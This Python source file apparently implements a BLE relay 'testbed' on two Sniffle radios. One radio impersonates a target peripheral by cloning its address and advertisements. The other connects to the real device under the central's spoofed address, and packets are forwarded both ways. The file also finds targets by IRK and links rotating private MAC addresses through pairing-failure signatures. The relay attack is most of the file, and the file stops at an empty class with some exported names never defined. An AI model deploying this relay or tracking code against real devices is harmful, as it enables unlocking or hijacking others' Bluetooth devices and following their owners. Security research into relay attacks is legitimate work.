"""Two-ended BLE pairing relay testbed and Security Manager Protocol (SMP) handshake analysis."""

from __future__ import annotations

import collections
import enum
import logging
import select
import socket
import struct
import threading
import time
from binascii import unhexlify
from dataclasses import dataclass, field
from typing import Any

from sniffle.packet_decoder import (
    AdvDirectIndMessage,
    AdvertMessage,
    AdvIndMessage,
    ConnectIndMessage,
    DataMessage,
    DPacketMessage,
    LlControlMessage,
    LlDataContMessage,
    ScanRspMessage,
    str_mac,
)
from sniffle.pcap import PcapBleWriter
from sniffle.relay_protocol import ErrorCode, MessageType, RelaySocketWrapper
from sniffle.sniffle_hw import (
    BLE_ADV_AA,
    DebugMessage,
    MeasurementMessage,
    PacketMessage,
    SnifferState,
    SniffleHW,
    StateMessage,
)

from airtell.device.serial_port import allocate_dual_ports, detect_optimal_baudrate
from airtell.topology.lifecycle import ShutdownCoordinator

logger = logging.getLogger(__name__)

__all__ = [
    "DualDongleRelayEngine",
    "PairingFailureCode",
    "PairingHandshakeEvent",
    "PairingRelayBridge",
    "PairingSignature",
    "RelayConfig",
    "RelayMasterRunner",
    "RelaySlaveRunner",
    "RelayedLinkLayerPacket",
    "SMPPairingState",
]


class SMPPairingState(enum.Enum):
    """Link Layer and Security Manager Protocol pairing handshake states."""

    IDLE = "IDLE"
    CONNECTED = "CONNECTED"
    PAIRING_REQUESTED = "PAIRING_REQUESTED"
    PAIRING_RESPONSE = "PAIRING_RESPONSE"
    CONFIRM_EXCHANGED = "CONFIRM_EXCHANGED"
    FAILED = "FAILED"
    COMPLETED = "COMPLETED"


class PairingFailureCode(enum.IntEnum):
    """Bluetooth Core Specification SMP Pairing Failed error reason codes."""

    PASSKEY_ENTRY_FAILED = 0x01
    OOB_NOT_AVAILABLE = 0x02
    AUTHENTICATION_REQUIREMENTS = 0x03
    CONFIRM_VALUE_FAILED = 0x04
    PAIRING_NOT_SUPPORTED = 0x05
    ENCRYPTION_KEY_SIZE = 0x06
    COMMAND_NOT_SUPPORTED = 0x07
    UNSPECIFIED_REASON = 0x08
    REPEATED_ATTEMPTS = 0x09
    INVALID_PARAMETERS = 0x0A
    DHKEY_CHECK_FAILED = 0x0B
    NUMERIC_COMPARISON_FAILED = 0x0C
    KEY_REJECTED = 0x0F


@dataclass
class RelayedLinkLayerPacket:
    """Link Layer packet forwarded across the inter-dongle relay queue.

    Attributes:
        channel: BLE physical channel (37, 38, 39, or data channel).
        rssi: Received signal strength in dBm.
        timestamp_usec: Microsecond epoch timestamp from radio hardware.
        pdu_type: Link Layer PDU type string (e.g., 'CONNECT_IND', 'SMP').
        initiator_mac: Transmitting initiator Bluetooth MAC address.
        target_mac: Destination recipient Bluetooth MAC address.
        raw_pdu: Raw binary PDU payload bytes.
    """

    channel: int
    rssi: int
    timestamp_usec: int
    pdu_type: str
    initiator_mac: str
    target_mac: str
    raw_pdu: bytes


@dataclass
class PairingHandshakeEvent:
    """Handshake transition or terminal outcome event from SMP packet inspection.

    Attributes:
        event_type: 'SMP_PAIRING_REQUEST', 'SMP_PAIRING_RESPONSE', or 'SMP_PAIRING_FAILED'.
        initiator_mac: Initiator MAC address.
        target_mac: Target peripheral MAC address.
        failure_code: Extracted PairingFailureCode reason if failed, else None.
        timestamp_usec: Timestamp of the event in microseconds.
        state: SMPPairingState resulting from the event.
    """

    event_type: str
    initiator_mac: str
    target_mac: str
    failure_code: PairingFailureCode | None
    timestamp_usec: int
    state: SMPPairingState


@dataclass
class PairingSignature:
    """Group of rotating MAC addresses linked by persistent pairing error signatures.

    Attributes:
        failure_code: PairingFailureCode shared across sessions.
        correlated_macs: Set of observed MAC addresses exhibiting this response.
        last_seen_usec: Latest observation timestamp in microseconds.
    """

    failure_code: PairingFailureCode
    correlated_macs: set[str] = field(default_factory=set)
    last_seen_usec: int = 0


class PairingRelayBridge:
    """Thread-safe relay bridge forwarding Link Layer frames and tracking SMP handshakes."""

    def __init__(self, maxsize: int = 5000) -> None:
        self.maxsize = maxsize
        self._relay_queue: collections.deque[RelayedLinkLayerPacket] = collections.deque(maxlen=maxsize)
        self._lock = threading.Lock()
        self.current_pairing_state: SMPPairingState = SMPPairingState.IDLE
        self._signatures_by_code: dict[PairingFailureCode, PairingSignature] = {}

    def ingest_sniffed_packet(self, packet: RelayedLinkLayerPacket) -> None:
        """Enqueue a packet captured by Device 1 (Observer/Sniffer) for Device 2."""
        with self._lock:
            self._relay_queue.append(packet)

    def drain_next_packet(self) -> RelayedLinkLayerPacket | None:
        """Pop the oldest packet from the relay queue for transmission by Device 2."""
        with self._lock:
            if self._relay_queue:
                return self._relay_queue.popleft()
            return None

    def pending_packets_count(self) -> int:
        """Return count of packets currently queued in relay buffer."""
        with self._lock:
            return len(self._relay_queue)

    def feed_pdu(
        self,
        pdu_type: str,
        initiator_mac: str,
        target_mac: str,
        payload_bytes: bytes,
        timestamp_usec: int,
    ) -> PairingHandshakeEvent | None:
        """Process incoming Link Layer / SMP frame and update handshake state machine.

        Args:
            pdu_type: 'CONNECT_IND', 'SMP', etc.
            initiator_mac: Source MAC address.
            target_mac: Destination MAC address.
            payload_bytes: Raw packet or SMP payload bytes.
            timestamp_usec: Microsecond timestamp.

        Returns:
            PairingHandshakeEvent if a recognized SMP transition occurs, else None.
        """
        init_mac = initiator_mac.upper()
        tgt_mac = target_mac.upper()

        if pdu_type == "CONNECT_IND":
            self.current_pairing_state = SMPPairingState.CONNECTED
            return None

        if pdu_type == "SMP" and payload_bytes:
            code = payload_bytes[0]

            # 0x01 = Pairing Request
            if code == 0x01:
                self.current_pairing_state = SMPPairingState.PAIRING_REQUESTED
                return PairingHandshakeEvent(
                    event_type="SMP_PAIRING_REQUEST",
                    initiator_mac=init_mac,
                    target_mac=tgt_mac,
                    failure_code=None,
                    timestamp_usec=timestamp_usec,
                    state=self.current_pairing_state,
                )

            # 0x02 = Pairing Response
            if code == 0x02:
                self.current_pairing_state = SMPPairingState.PAIRING_RESPONSE
                return PairingHandshakeEvent(
                    event_type="SMP_PAIRING_RESPONSE",
                    initiator_mac=init_mac,
                    target_mac=tgt_mac,
                    failure_code=None,
                    timestamp_usec=timestamp_usec,
                    state=self.current_pairing_state,
                )

            # 0x03 = Pairing Confirm
            if code == 0x03:
                self.current_pairing_state = SMPPairingState.CONFIRM_EXCHANGED
                return PairingHandshakeEvent(
                    event_type="SMP_PAIRING_CONFIRM",
                    initiator_mac=init_mac,
                    target_mac=tgt_mac,
                    failure_code=None,
                    timestamp_usec=timestamp_usec,
                    state=self.current_pairing_state,
                )

            # 0x05 = Pairing Failed
            if code == 0x05 and len(payload_bytes) >= 2:
                reason_byte = payload_bytes[1]
                try:
                    failure_code = PairingFailureCode(reason_byte)
                except ValueError:
                    failure_code = PairingFailureCode.UNSPECIFIED_REASON

                self.current_pairing_state = SMPPairingState.FAILED

                # Record correlation signature
                if failure_code not in self._signatures_by_code:
                    self._signatures_by_code[failure_code] = PairingSignature(
                        failure_code=failure_code,
                        correlated_macs={init_mac},
                        last_seen_usec=timestamp_usec,
                    )
                else:
                    sig = self._signatures_by_code[failure_code]
                    sig.correlated_macs.add(init_mac)
                    sig.last_seen_usec = timestamp_usec

                return PairingHandshakeEvent(
                    event_type="SMP_PAIRING_FAILED",
                    initiator_mac=init_mac,
                    target_mac=tgt_mac,
                    failure_code=failure_code,
                    timestamp_usec=timestamp_usec,
                    state=self.current_pairing_state,
                )

        return None

    def get_linked_pairing_signatures(self) -> list[PairingSignature]:
        """Return list of pairing signatures linking rotating MAC addresses."""
        with self._lock:
            return list(self._signatures_by_code.values())


@dataclass
class RelayConfig:
    """Configuration options for the two-ended BLE pairing relay testbed."""

    port1: str = "/dev/ttyUSB0"
    port2: str = "/dev/ttyUSB1"
    mac: str | None = None
    irk: str | None = None
    search_string: str | None = None
    is_public: bool = False
    advchan: int = 37
    fast_slave: bool = False
    fast_master: bool = False
    preload_str: str | None = None
    pause: bool = False
    quiet: bool = False
    pcap_path: str | None = None
    duration_sec: float | None = None
    mock: bool = False

    def validate(self) -> None:
        """Validate configuration parameters for consistency and physical hardware constraints."""
        if self.advchan not in (37, 38, 39):
            raise ValueError(f"Advertising channel must be 37, 38, or 39, got {self.advchan}")

        targ_specs = bool(self.mac) + bool(self.irk) + bool(self.search_string)
        if targ_specs > 1:
            raise ValueError("IRK, MAC, and advertisement search string filters are mutually exclusive!")

        if self.is_public and self.irk:
            raise ValueError("IRK only works on RPAs, not public addresses!")

        if self.is_public and self.search_string:
            raise ValueError("Cannot specify string search target MAC publicness")

        if self.mac is not None:
            try:
                mac_parts = [int(h, 16) for h in self.mac.split(":")]
                if len(mac_parts) != 6:
                    raise ValueError("Wrong length")
            except (ValueError, TypeError) as err:
                raise ValueError(f"MAC address must be 6 colon-separated hex bytes, got '{self.mac}'") from err

        if self.irk is not None:
            if len(self.irk) != 32:
                raise ValueError(f"IRK must be 32 hex characters (16 bytes), got {len(self.irk)}")
            try:
                unhexlify(self.irk)
            except Exception as err:
                raise ValueError(f"Invalid hex string for IRK: '{self.irk}'") from err

        if self.duration_sec is not None and self.duration_sec <= 0:
            raise ValueError(f"duration_sec must be positive if specified, got {self.duration_sec}")

        if not self.mock and self.port1 and self.port2:
            allocate_dual_ports(self.port1, self.port2)


def has_instant(pkt: Any) -> bool:
    """Determine whether Link Layer Control packet carries an instant in the past."""
    return isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]


def is_param_req(pkt: Any) -> bool:
    """Determine whether packet is an LL_CONNECTION_PARAM_REQ control PDU."""
    return isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0F


def parse_preloads(preload_str: str | None) -> list[tuple[int, int]]:
    """Parse comma-separated Interval:delta preload strings into list of tuples."""
    preloads: list[tuple[int, int]] = []
    if preload_str:
        for tstr in preload_str.split(","):
            tsplit = tstr.strip().split(":")
            if len(tsplit) == 2:
                try:
                    preloads.append((int(tsplit[0]), int(tsplit[1])))
                except ValueError:
                    pass
    return preloads


def print_message(msg: Any, quiet: bool = False) -> None:
    """Print decoded Bluetooth message unless suppressed by quiet flag."""
    if isinstance(msg, DPacketMessage):
        is_empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
        if not quiet or not is_empty:
            print(msg, end="\n\n")
    elif isinstance(msg, (DebugMessage, StateMessage, MeasurementMessage)):
        if not quiet:
            print(msg, end="\n\n")


def write_packet_to_pcap(writer: Any, pkt: Any) -> None:
    """Write Link Layer packet to PCAP file writer."""
    if writer is None:
        return
    try:
        ts_usec = int(getattr(pkt, "ts_epoch", time.time()) * 1_000_000)
        aa = getattr(pkt, "aa", BLE_ADV_AA)
        chan = getattr(pkt, "chan", 37)
        rssi = getattr(pkt, "rssi", -50)
        body = getattr(pkt, "body", b"")
        phy = getattr(pkt, "phy", 0)
        pdu_type = 3 if isinstance(pkt, DataMessage) and getattr(pkt, "data_dir", False) else (2 if isinstance(pkt, DataMessage) else 0)
        writer.write_packet(ts_usec, aa, chan, rssi, body, phy, pdu_type)
    except Exception as exc:
        logger.warning("Error writing packet to PCAP: %s", exc)


class RelayMasterRunner:
    """Runs Sniffle hardware in Central / Master role (C_r), interacting with target peripheral."""

    def __init__(
        self,
        hw: SniffleHW,
        conn: RelaySocketWrapper,
        config: RelayConfig,
        bridge: PairingRelayBridge,
        stop_event: threading.Event,
        pcap_writer: PcapBleWriter | None = None,
    ) -> None:
        self.hw = hw
        self.conn = conn
        self.config = config
        self.bridge = bridge
        self.stop_event = stop_event
        self.pcap_writer = pcap_writer
        self.forwarded_packets_count = 0
        self.target_mac_bytes: list[int] | None = None
        self.initiator_mac_bytes: list[int] | None = None

    def get_mac_from_irk(self, irk: bytes, chan: int = 37) -> list[int] | None:
        """Scan for target Resolvable Private Address matching supplied IRK."""
        self.hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
        self.hw.cmd_pause_done(True)
        self.hw.cmd_follow(False)
        self.hw.cmd_rssi(-128)
        self.hw.cmd_irk(irk, False)
        self.hw.cmd_auxadv(False)
        self.hw.mark_and_flush()

        logger.info("Master: Waiting for advertisement matching IRK...")
        while not self.stop_event.is_set():
            ready, _, _ = select.select([self.hw.ser.fd], [], [], 0.2)
            if self.hw.ser.fd in ready:
                msg = self.hw.recv_and_decode()
                if not isinstance(msg, PacketMessage):
                    continue
                dpkt = DPacketMessage.decode(msg)
                if isinstance(dpkt, (AdvIndMessage, AdvDirectIndMessage)):
                    logger.info("Found target MAC from IRK: %s", str_mac(dpkt.AdvA))
                    return dpkt.AdvA
        return None

    def get_mac_from_string(self, search_bytes: bytes, chan: int = 37) -> tuple[list[int] | None, bool]:
        """Scan for target advertisement payload containing specified search string."""
        self.hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
        self.hw.cmd_pause_done(True)
        self.hw.cmd_follow(False)
        self.hw.cmd_rssi(-128)
        self.hw.cmd_mac()
        self.hw.cmd_auxadv(False)
        self.hw.random_addr()
        self.hw.cmd_scan()
        self.hw.mark_and_flush()

        logger.info("Master: Waiting for advertisement containing search string...")
        while not self.stop_event.is_set():
            ready, _, _ = select.select([self.hw.ser.fd], [], [], 0.2)
            if self.hw.ser.fd in ready:
                msg = self.hw.recv_and_decode()
                if not isinstance(msg, PacketMessage):
                    continue
                dpkt = DPacketMessage.decode(msg)
                if isinstance(dpkt, (AdvIndMessage, AdvDirectIndMessage, ScanRspMessage)):
                    if search_bytes in dpkt.body:
                        logger.info("Found target MAC from search string: %s", str_mac(dpkt.AdvA))
                        return dpkt.AdvA, not dpkt.TxAdd
        return None, False

    def discover_target(self, chan: int = 37) -> tuple[list[int] | None, bool]:
        """Auto-discover first connectable legacy advertiser on the channel."""
        self.hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
        self.hw.cmd_pause_done(True)
        self.hw.cmd_follow(False)
        self.hw.cmd_rssi(-128)
        self.hw.cmd_mac()
        self.hw.cmd_auxadv(False)
        self.hw.random_addr()
        self.hw.cmd_scan()
        self.hw.mark_and_flush()

        logger.info("Master: Scanning for target advertiser on channel %d...", chan)
        while not self.stop_event.is_set():
            ready, _, _ = select.select([self.hw.ser.fd], [], [], 0.2)
            if self.hw.ser.fd in ready:
                msg = self.hw.recv_and_decode()
                if not isinstance(msg, PacketMessage):
                    continue
                dpkt = DPacketMessage.decode(msg)
                if isinstance(dpkt, (AdvIndMessage, AdvDirectIndMessage)):
                    logger.info("Auto-discovered target MAC: %s", str_mac(dpkt.AdvA))
                    return dpkt.AdvA, not dpkt.TxAdd
        return None, False

    def scan_target(self, mac: list[int]) -> tuple[Any | None, Any | None]:
        """Capture target advertisement and scan response frames."""
        adv_pkt = None
        scan_rsp_pkt = None

        self.hw.cmd_chan_aa_phy(self.config.advchan, BLE_ADV_AA, 0)
        self.hw.cmd_pause_done(True)
        self.hw.cmd_follow(False)
        self.hw.cmd_rssi(-128)
        self.hw.cmd_mac(mac, False)
        self.hw.cmd_auxadv(False)
        self.hw.random_addr()
        self.hw.cmd_scan()
        self.hw.mark_and_flush()

        while (adv_pkt is None or scan_rsp_pkt is None) and not self.stop_event.is_set():
            ready, _, _ = select.select([self.hw.ser.fd], [], [], 0.2)
            if self.hw.ser.fd in ready:
                msg = self.hw.recv_and_decode()
                if not isinstance(msg, PacketMessage):
                    continue
                dpkt = DPacketMessage.decode(msg)
                if isinstance(dpkt, AdvIndMessage):
                    if adv_pkt is None:
                        logger.info("Master: Captured target advertisement.")
                    adv_pkt = dpkt
                elif isinstance(dpkt, ScanRspMessage):
                    if scan_rsp_pkt is None:
                        logger.info("Master: Captured target scan response.")
                    scan_rsp_pkt = dpkt
                elif isinstance(dpkt, AdvertMessage):
                    logger.warning("Received incompatible advertisement: %s", getattr(dpkt, "pdutype", "unknown"))
                    return None, None

        return adv_pkt, scan_rsp_pkt

    def connect_target(
        self,
        targ_mac: list[int],
        chan: int = 37,
        targ_random: bool = True,
        initiator_mac: list[int] | None = None,
        initiator_random: bool = True,
        interval: int = 24,
        latency: int = 1,
        preloads: list[tuple[int, int]] | None = None,
    ) -> int:
        """Command Master Sniffle radio to initiate connection to target peripheral."""
        if preloads is None:
            preloads = []
        self.hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
        self.hw.cmd_pause_done(True)
        self.hw.cmd_follow(False)
        self.hw.cmd_rssi(-128)
        self.hw.cmd_mac(targ_mac, False)
        self.hw.cmd_auxadv(False)
        self.hw.cmd_interval_preload(preloads)
        self.hw.cmd_phy_preload()
        if initiator_mac is None:
            self.hw.random_addr()
        else:
            self.hw.cmd_setaddr(initiator_mac, initiator_random)
        self.hw.mark_and_flush()

        return self.hw.initiate_conn(targ_mac, targ_random, interval, latency)

    def run(self) -> None:
        """Execute the Master runner lifecycle."""
        try:
            # 1. Latency test
            stime = time.time()
            self.conn.send_msg(MessageType.PING, b"latency_test")
            while not self.stop_event.is_set():
                ready, _, _ = select.select([self.conn.sock], [], [], 0.2)
                if self.conn.sock in ready:
                    mtype, body = self.conn.recv_msg()
                    if mtype != MessageType.PING or body != b"latency_test":
                        raise ValueError(f"Unexpected latency ping response: {mtype}")
                    break

            if self.stop_event.is_set():
                return

            etime = time.time()
            logger.info("Relay IPC round-trip latency: %.2f ms", (etime - stime) * 1000)

            # 2. Preloads
            if self.config.preload_str:
                self.conn.send_msg(MessageType.PRELOAD, bytes(self.config.preload_str, encoding="utf-8"))
            else:
                self.conn.send_msg(MessageType.PRELOAD, b"")

            # 3. Target acquisition
            if self.config.irk:
                mac_bytes = self.get_mac_from_irk(unhexlify(self.config.irk), self.config.advchan)
            elif self.config.search_string:
                search_bytes = self.config.search_string.encode("latin-1").decode("unicode_escape").encode("latin-1")
                mac_bytes, is_pub = self.get_mac_from_string(search_bytes, self.config.advchan)
                self.config.is_public = is_pub
            elif self.config.mac:
                mac_bytes = [int(h, 16) for h in reversed(self.config.mac.split(":"))]
            else:
                mac_bytes, is_pub = self.discover_target(self.config.advchan)
                if is_pub is not None:
                    self.config.is_public = is_pub

            if not mac_bytes or self.stop_event.is_set():
                return

            self.target_mac_bytes = mac_bytes

            # 4. Scan target advertisement & scan response
            adv, scan_rsp = self.scan_target(mac_bytes)
            if self.stop_event.is_set():
                return
            if not adv or not scan_rsp:
                logger.error("Error: Advertisement type must be ADV_IND. Aborting.")
                self.conn.send_err(ErrorCode.INVALID_ADV)
                return

            self.conn.send_msg(MessageType.ADVERT, adv.body)
            self.conn.send_msg(MessageType.SCAN_RSP, scan_rsp.body)

            if self.pcap_writer:
                write_packet_to_pcap(self.pcap_writer, adv)
                write_packet_to_pcap(self.pcap_writer, scan_rsp)

            # 5. Pause handling
            if self.config.pause:
                logger.info("Paused. Awaiting unpause...")
                while not self.stop_event.is_set():
                    time.sleep(0.1)

            self.conn.send_msg(MessageType.PING, b"")

            # 6. Wait for connection notification from slave
            conn_req = None
            while not self.stop_event.is_set():
                ready, _, _ = select.select([self.conn.sock], [], [], 0.2)
                if self.conn.sock in ready:
                    mtype, body = self.conn.recv_msg()
                    if mtype == MessageType.CONN_REQ:
                        conn_req = DPacketMessage.from_body(body)
                        break

            if self.stop_event.is_set() or not conn_req:
                return

            self.initiator_mac_bytes = conn_req.InitA
            if self.pcap_writer:
                write_packet_to_pcap(self.pcap_writer, conn_req)

            # Feed CONNECT_IND to bridge
            now_us = int(time.time() * 1_000_000)
            self.bridge.feed_pdu("CONNECT_IND", str_mac(conn_req.InitA), str_mac(mac_bytes), conn_req.body, now_us)

            # 7. Connect to real target
            connector_addr = conn_req.InitA
            connector_random = bool(conn_req.TxAdd)
            if self.config.fast_master:
                connector_interval = 6
                connector_latency = 0
            else:
                connector_interval = conn_req.Interval
                connector_latency = conn_req.Latency

            preloads = parse_preloads(self.config.preload_str)
            self.connect_target(
                mac_bytes,
                self.config.advchan,
                not self.config.is_public,
                connector_addr,
                connector_random,
                connector_interval,
                connector_latency,
                preloads,
            )

            # Wait for central state transition
            while not self.stop_event.is_set():
                ready, _, _ = select.select([self.hw.ser.fd], [], [], 0.2)
                if self.hw.ser.fd in ready:
                    msg = self.hw.recv_and_decode()
                    if isinstance(msg, StateMessage) and msg.new_state == SnifferState.CENTRAL:
                        self.hw.decoder_state.cur_aa = conn_req.aa_conn
                        break

            if self.stop_event.is_set():
                return

            logger.info("Connected to target peripheral.")

            # Request fast connection interval on slave if requested
            if self.config.fast_slave:
                conn_update_pdu = DPacketMessage.from_body(
                    b"\x03\x18\x0f\x06\x00\x0c\x00\x00\x00\xf4\x01\x03"
                    b"\x05\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x00\x00"
                )
                self.conn.send_msg(MessageType.PACKET, b"\x04\x00" + conn_update_pdu.body)

            # 8. Bidirectional packet forwarding loop
            self.forwarding_loop()

        except Exception as exc:
            if not self.stop_event.is_set():
                logger.error("RelayMasterRunner error: %s", exc, exc_info=True)
        finally:
            self.stop_event.set()

    def forwarding_loop(self) -> None:
        """Forward packets bidirectionally between serial port and relay IPC socket."""
        filter_changes = self.config.fast_slave or self.config.fast_master
        while not self.stop_event.is_set():
            try:
                ready, _, _ = select.select([self.hw.ser.fd, self.conn.sock], [], [], 0.1)
            except (ValueError, OSError):
                break

            if self.conn.sock in ready:
                self.sock_recv_forward(filter_changes)
            if self.hw.ser.fd in ready:
                self.ser_recv_forward(filter_changes)

    def sock_recv_forward(self, filter_changes: bool = False) -> None:
        """Process packet received from Relay Slave via socket and forward to genuine peripheral."""
        try:
            mtype, body = self.conn.recv_msg()
        except (IOError, OSError, TimeoutError):
            return

        if mtype != MessageType.PACKET or len(body) < 2:
            return

        event, = struct.unpack("<H", body[:2])
        body = body[2:]
        llid = body[0] & 3
        pdu = body[2:]

        pkt = DPacketMessage.from_body(body, True)
        pkt.ts_epoch = time.time()
        pkt.ts = pkt.ts_epoch - self.hw.decoder_state.first_epoch_time
        pkt.aa = self.hw.decoder_state.cur_aa
        pkt.event = event

        if not (filter_changes and has_instant(pkt)):
            self.hw.cmd_transmit(llid, pdu, event)

        self.forwarded_packets_count += 1
        self._inspect_and_bridge_packet(pkt, body, is_from_slave=True)

        if not self.config.quiet:
            print_message(pkt, self.config.quiet)

        if self.pcap_writer:
            write_packet_to_pcap(self.pcap_writer, pkt)

    def ser_recv_forward(self, filter_changes: bool = False) -> None:
        """Process packet received from peripheral via serial port and forward to Relay Slave."""
        try:
            msg = self.hw.recv_and_decode()
        except (IOError, OSError, TimeoutError):
            return

        if isinstance(msg, PacketMessage):
            dpkt = DPacketMessage.decode(msg)
            is_empty = isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0
            block_req = filter_changes and is_param_req(dpkt)
            if not is_empty and not block_req:
                try:
                    self.conn.send_msg(MessageType.PACKET, struct.pack("<H", dpkt.event) + dpkt.body)
                    self.forwarded_packets_count += 1
                    self._inspect_and_bridge_packet(dpkt, dpkt.body, is_from_slave=False)
                    if self.pcap_writer:
                        write_packet_to_pcap(self.pcap_writer, dpkt)
                except (IOError, OSError):
                    return
            if block_req:
                self.hw.cmd_transmit(3, b"\x11\x0F\x3B")

            if not self.config.quiet:
                print_message(dpkt, self.config.quiet)
        elif msg is not None and not self.config.quiet:
            print_message(msg, self.config.quiet)

    def _inspect_and_bridge_packet(self, pkt: Any, body: bytes, is_from_slave: bool) -> None:
        """Inspect Link Layer data packet for SMP handshake frames and feed into PairingRelayBridge."""
        now_us = int(time.time() * 1_000_000)
        initiator_mac = str_mac(self.initiator_mac_bytes) if self.initiator_mac_bytes else "00:00:00:00:00:00"
        target_mac = str_mac(self.target_mac_bytes) if self.target_mac_bytes else "00:00:00:00:00:00"

        pdu_type = "DATA"
        if len(body) >= 6:
            llid = body[0] & 3
            if llid == 2:  # L2CAP start
                l2cap_len, l2cap_cid = struct.unpack("<HH", body[2:6])
                if l2cap_cid == 0x0006:  # SMP CID
                    pdu_type = "SMP"
                    payload = body[6 : 6 + l2cap_len]
                    src = initiator_mac if is_from_slave else target_mac
                    dst = target_mac if is_from_slave else initiator_mac
                    self.bridge.feed_pdu(pdu_type, src, dst, payload, now_us)

        chan = getattr(pkt, "chan", self.config.advchan)
        rssi = getattr(pkt, "rssi", -50)
        relayed_pkt = RelayedLinkLayerPacket(
            channel=chan,
            rssi=rssi,
            timestamp_usec=now_us,
            pdu_type=pdu_type,
            initiator_mac=initiator_mac,
            target_mac=target_mac,
            raw_pdu=body,
        )
        self.bridge.ingest_sniffed_packet(relayed_pkt)


class RelaySlaveRunner:
    """Runs Sniffle hardware in Peripheral / Slave role (P_r), impersonating target to genuine central."""

    def __init__(
        self,
        hw: SniffleHW,
        conn: RelaySocketWrapper,
        config: RelayConfig,
        bridge: PairingRelayBridge,
        stop_event: threading.Event,
    ) -> None:
        self.hw = hw
        self.conn = conn
        self.config = config
        self.bridge = bridge
        self.stop_event = stop_event
        self.forwarded_packets_count = 0

    def run(self) -> None:
        """Execute the Slave runner lifecycle."""
        try:
            # 1. Answer latency ping
            while not self.stop_event.is_set():
                ready, _, _ = select.select([self.conn.sock], [], [], 0.2)
                if self.conn.sock in ready:
                    mtype, body = self.conn.recv_msg()
                    if mtype == MessageType.PING and body == b"latency_test":
                        self.conn.send_msg(MessageType.PING, b"latency_test")
                        break

            if self.stop_event.is_set():
                return

            # 2. Put hardware in initial clean state
            self.hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
            self.hw.cmd_pause_done(True)
            self.hw.cmd_follow(False)
            self.hw.cmd_rssi(-128)
            self.hw.cmd_mac()
            self.hw.cmd_auxadv(False)

            # 3. Receive and apply preloads
            while not self.stop_event.is_set():
                ready, _, _ = select.select([self.conn.sock], [], [], 0.2)
                if self.conn.sock in ready:
                    mtype, body = self.conn.recv_msg()
                    if mtype == MessageType.PRELOAD:
                        plstr = str(body, encoding="utf-8")
                        preloads = parse_preloads(plstr)
                        self.hw.cmd_interval_preload(preloads)
                        self.hw.cmd_phy_preload()
                        break

            if self.stop_event.is_set():
                return

            # 4. Receive advertisement and scan response
            advert_body = None
            scan_rsp_body = None
            while not self.stop_event.is_set() and (advert_body is None or scan_rsp_body is None):
                ready, _, _ = select.select([self.conn.sock], [], [], 0.2)
                if self.conn.sock in ready:
                    mtype, body = self.conn.recv_msg()
                    if mtype == MessageType.ADVERT:
                        advert_body = body
                    elif mtype == MessageType.SCAN_RSP:
                        scan_rsp_body = body
                    elif mtype == MessageType.ERROR:
                        return

            if self.stop_event.is_set() or not advert_body or not scan_rsp_body:
                return

            # 5. Wait for unpause ping
            while not self.stop_event.is_set():
                ready, _, _ = select.select([self.conn.sock], [], [], 0.2)
                if self.conn.sock in ready:
                    mtype, _ = self.conn.recv_msg()
                    if mtype == MessageType.PING:
                        break

            if self.stop_event.is_set():
                return

            # 6. Configure radio to impersonate target peripheral
            advert = DPacketMessage.from_body(advert_body)
            scan_rsp = DPacketMessage.from_body(scan_rsp_body)

            self.hw.cmd_setaddr(advert.AdvA, bool(advert.TxAdd))
            self.hw.cmd_adv_interval(200)
            adv_data = advert.body[8:]
            scan_rsp_data = scan_rsp.body[8:]
            self.hw.cmd_follow(True)
            self.hw.mark_and_flush()
            self.hw.cmd_advertise(adv_data, scan_rsp_data)

            # 7. Wait for central to connect
            conn_pkt = None
            while conn_pkt is None and not self.stop_event.is_set():
                ready, _, _ = select.select([self.hw.ser.fd], [], [], 0.2)
                if self.hw.ser.fd in ready:
                    msg = self.hw.recv_and_decode()
                    if not isinstance(msg, PacketMessage):
                        continue
                    dpkt = DPacketMessage.decode(msg)
                    if not self.config.quiet:
                        print_message(dpkt, self.config.quiet)
                    if isinstance(dpkt, ConnectIndMessage):
                        self.hw.decoder_state.cur_aa = dpkt.aa_conn
                        conn_pkt = dpkt
                        break

            if self.stop_event.is_set() or not conn_pkt:
                return

            # Notify master of connection request
            self.conn.send_msg(MessageType.CONN_REQ, conn_pkt.body)

            # 8. Bidirectional packet forwarding loop
            self.forwarding_loop()

        except Exception as exc:
            if not self.stop_event.is_set():
                logger.error("RelaySlaveRunner error: %s", exc, exc_info=True)
        finally:
            self.stop_event.set()

    def forwarding_loop(self) -> None:
        """Forward packets bidirectionally between serial port and relay IPC socket."""
        while not self.stop_event.is_set():
            try:
                ready, _, _ = select.select([self.hw.ser.fd, self.conn.sock], [], [], 0.1)
            except (ValueError, OSError):
                break

            if self.conn.sock in ready:
                self.sock_recv_forward()
            if self.hw.ser.fd in ready:
                self.ser_recv_forward()

    def sock_recv_forward(self) -> None:
        """Process packet received from Relay Master via socket and forward to central."""
        try:
            mtype, body = self.conn.recv_msg()
        except (IOError, OSError, TimeoutError):
            return

        if mtype != MessageType.PACKET or len(body) < 2:
            return

        event, = struct.unpack("<H", body[:2])
        body = body[2:]
        llid = body[0] & 3
        pdu = body[2:]

        self.hw.cmd_transmit(llid, pdu, event)
        self.forwarded_packets_count += 1

        pkt = DPacketMessage.from_body(body, True, True)
        pkt.ts_epoch = time.time()
        pkt.ts = pkt.ts_epoch - self.hw.decoder_state.first_epoch_time
        pkt.event = event

        if not self.config.quiet:
            print_message(pkt, self.config.quiet)

    def ser_recv_forward(self) -> None:
        """Process packet received from central via serial port and forward to Relay Master."""
        try:
            msg = self.hw.recv_and_decode()
        except (IOError, OSError, TimeoutError):
            return

        if isinstance(msg, PacketMessage):
            dpkt = DPacketMessage.decode(msg)
            is_empty = isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0
            if not is_empty:
                try:
                    self.conn.send_msg(MessageType.PACKET, struct.pack("<H", dpkt.event) + dpkt.body)
                    self.forwarded_packets_count += 1
                except (IOError, OSError):
                    return

            if not self.config.quiet:
                print_message(dpkt, self.config.quiet)
        elif msg is not None and not self.config.quiet:
            print_message(msg, self.config.quiet)


class DualDongleRelayEngine:
    """Orchestrates two-ended BLE pairing relay testbed across dual Sniffle radios."""

